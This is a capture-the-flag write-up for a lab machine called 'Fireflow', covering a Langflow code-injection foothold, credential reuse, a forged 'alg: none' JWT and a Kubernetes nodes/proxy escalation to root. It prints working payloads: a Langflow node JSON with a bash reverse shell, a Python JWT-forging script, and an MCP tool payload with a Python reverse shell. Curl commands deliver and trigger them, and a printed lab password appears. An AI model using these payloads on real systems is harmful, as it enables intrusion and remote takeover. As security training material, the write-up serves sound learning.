# Fireflow

## Recon

I begin by opening the browser developer tools and immediately checking the Network tab for leaked API paths.

![1](/home/laz/Pictures/Screenshots/Screenshot%20From%202026-10-04%2012-36-21.png)
![2](/home/laz/Pictures/Screenshots/Screenshot%20From%202026-10-04%2012-36-54.png)

A quick inspection reveals an exposed `/version` endpoint. Curling it shows a vulnerability in the Langflow version, and once again the browser network tab leaks this information.

<img width="1920" height="923" alt="Screenshot From 2026-10-04 12-46-39" src="https://github.com/user-attachments/assets/857efabe-7aca-41df-9584-7cbf578f8c2a" />

The vulnerable payload structure is as follows:

```json
{
  "data": {
    "nodes": [
      {
        "id": "Exploit-001",
        "type": "genericNode",
        "position": {
          "x": 0,
          "y": 0
        },
        "data": {
          "id": "Exploit-001",
          "type": "ExploitComp",
          "node": {
            "template": {
              "code": {
                "type": "code",
                "required": true,
                "show": true,
                "multiline": true,
                "value": "import os\n\n_x = os.system(\"bash -c 'bash -i >& /dev/tcp/10.10.15.149/9001 0>&1'\")\n\nfrom lfx.custom.custom_component.component import Component\nfrom lfx.io import Output\nfrom lfx.schema.data import Data\n\nclass ExploitComp(Component):\n    display_name=\"X\"\n    outputs=[Output(display_name=\"O\",name=\"o\",method=\"r\")]\n    def r(self)->Data:\n        return Data(data={})",
                "name": "code",
                "password": false,
                "advanced": false,
                "dynamic": false
              },
              "_type": "Component"
            },
            "description": "X",
            "base_classes": [
              "Data"
            ],
            "display_name": "ExploitComp",
            "name": "ExploitComp",
            "frozen": false,
            "outputs": [
              {
                "types": [
                  "Data"
                ],
                "selected": "Data",
                "name": "o",
                "display_name": "O",
                "method": "r",
                "value": "__UNDEFINED__",
                "cache": true,
                "allows_loop": false,
                "tool_mode": false,
                "hidden": null,
                "required_inputs": null,
                "group_outputs": false
              }
            ],
            "field_order": [
              "code"
            ],
            "beta": false,
            "edited": false
          }
        }
      }
    ],
    "edges": []
  }
}
```

I save this as `payload.json` and send it to the vulnerable endpoint.

<img width="1350" height="203" alt="Screenshot From 2026-10-04 13-40-53" src="https://github.com/user-attachments/assets/e0520a34-2159-4863-96e8-2970ca29c208" />

This gives us a shell as `www`.

## Lateral Movement

We may now search for hidden files. In `/etc/langflow`, we can find a `.env` file containing critical configuration information.

<img width="1350" height="281" alt="Screenshot From 2026-10-04 13-45-51" src="https://github.com/user-attachments/assets/d383aabe-0299-47d9-9180-c4afaf720fcf" />

We can use this information together with SSH to move laterally to the next user, `nightfall`.

Inside the `nightfall` home directory, we find a hidden MCP configuration file:

```json
{
  "server": "http://10.129.154.131:30080",
  "status_endpoint": "/api/v1/version",
  "user": "langflow-bot",
  "password": "Langfl0w@mcp2026!"
}
```

We can use `json.tool` to perform more reconnaissance on the target services.

<img width="1211" height="511" alt="Screenshot From 2026-10-04 13-52-43" src="https://github.com/user-attachments/assets/48becc30-6d8d-4c45-8cf1-020e0437cbdc" />

Interestingly, `none` is set as the JWT algorithm, which means a user token is vulnerable to privilege escalation.

## Token Privilege Escalation

By curling the endpoint with the leaked credentials, we can decode the JWT like so:

<img width="1918" height="156" alt="Screenshot From 2026-10-04 14-05-07" src="https://github.com/user-attachments/assets/1d208a63-82e3-4803-81bf-63d88fd9c913" />

Using the following script, we abuse the `none` vulnerability and create a malicious JWT:

```python
import base64, json

def b64url(data):
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

header = b64url(json.dumps({"alg": "none", "typ": "JWT"}).encode())
payload = b64url(json.dumps({"sub": "attacker", "role": "admin"}).encode())
token = f"{header}.{payload}."
print(token)
```

<img width="1426" height="146" alt="Screenshot From 2026-10-04 14-08-35" src="https://github.com/user-attachments/assets/3ce8061a-a7ed-49f6-a2bc-3875c875dbeb" />

This gives us the following JWT, which we turn into an environment variable for exploitation:

```bash
ADMIN_JWT="eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhdHRhY2tlciIsInJvbGUiOiJhZG1pbiJ9."
```

We create another `payload.json` file:

```json
{
  "name": "shell",
  "description": "debug shell",
  "inputSchema": {"type":"object","properties":{}},
  "code": "import socket,os,pty\npid=os.fork()\nif pid>0:\n import sys;sys.exit(0)\nos.setsid()\npid=os.fork()\nif pid>0:\n import sys;sys.exit(0)\ns=socket.socket()\ns.connect((\"10.10.15.149\",9001))\n[os.dup2(s.fileno(), i) for i in(0,1,2)]\npty.spawn(\"/bin/sh\")"
}
```

Then we send it off like so:

```bash
curl -s -X POST http://10.129.154.131:30080/api/v1/tools \
  -H 'Content-Type: application/json' \
  -H "Authorization: Bearer $ADMIN_JWT" \
  -d @payload.json
```

We set a listener:

```bash
nc -lvnp 9001
```

And trigger the exploit using the MCP tool:

```bash
curl -s -X POST http://10.129.154.131:30080/mcp \
  -H 'Content-Type: application/json' \
  -H "Authorization: Bearer $ADMIN_JWT" \
  -d '{"jsonrpc":"2.0","id":4,"method":"tools/call","params":{"name":"shell","arguments":{}}}'
```

We now have a shell as the `mcp` user.

## Privilege Escalation

After doing some basic reconnaissance, we can see that we are in a Kubernetes cluster with heavily restricted internet access but with executable permissions available.

We enumerate our environment variables so that we can set our Kubernetes token for authorization.

<img width="762" height="568" alt="Screenshot From 2026-10-04 16-07-16" src="https://github.com/user-attachments/assets/89bdce47-895d-4487-bba8-c03727d18f85" />
<img width="1270" height="292" alt="Screenshot From 2026-10-04 16-05-36" src="https://github.com/user-attachments/assets/fe74a12b-686f-4289-b2b8-1ce7ab467f63" />

By enumerating the Kubernetes rules and services, we can see that we have the dangerously privileged `nodes/proxy` permission. This suggests that the host root filesystem is likely under `/host/root`.

After some API enumeration, we find our target IP for the exploit script.

<img width="1270" height="108" alt="Screenshot From 2026-10-04 16-04-32" src="https://github.com/user-attachments/assets/6af4f86d-31ec-4fc6-9192-284a3607f021" />

Now that we have the script, we can create the RCE payload.

<img width="991" height="806" alt="Screenshot From 2026-10-04 16-03-44" src="https://github.com/user-attachments/assets/eaf98bdf-6047-4747-839b-2db3dae39e1f" />

I now read the root flag by calling the script with the parameter:

```bash
('cat /host/root/root/root.txt')
```

<img width="991" height="101" alt="Screenshot From 2026-10-04 16-03-16" src="https://github.com/user-attachments/assets/7916bfd9-f480-4012-9b47-7461e7360d22" />
